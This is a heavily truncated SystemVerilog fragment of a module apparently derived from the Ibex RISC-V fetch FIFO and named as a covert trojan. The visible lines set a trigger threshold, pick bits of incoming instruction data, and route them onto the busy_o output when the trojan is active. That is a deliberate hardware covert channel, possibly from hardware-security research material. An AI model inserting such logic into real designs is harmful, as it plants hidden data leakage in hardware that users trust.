...
module ibex_fetch_fifo_trojan_Covert #(
  ...
  output logic                out_err_plus2_o
    ...
    // ============================================================
    localparam int TRIGGER_THRESHOLD = 6534;
    ...
    always_ff @(posedge clk_i or negedge rst_ni) begin
        ...
        assign current_bit = in_rdata_i[covert_bit_index];  // <-- FIXED: use trigger_signal
  ...
  // with NUM_REQS.
  assign busy_o = trojan_active ? covert_bit_out : (valid_q[DEPTH-1:DEPTH-NUM_REQS]);
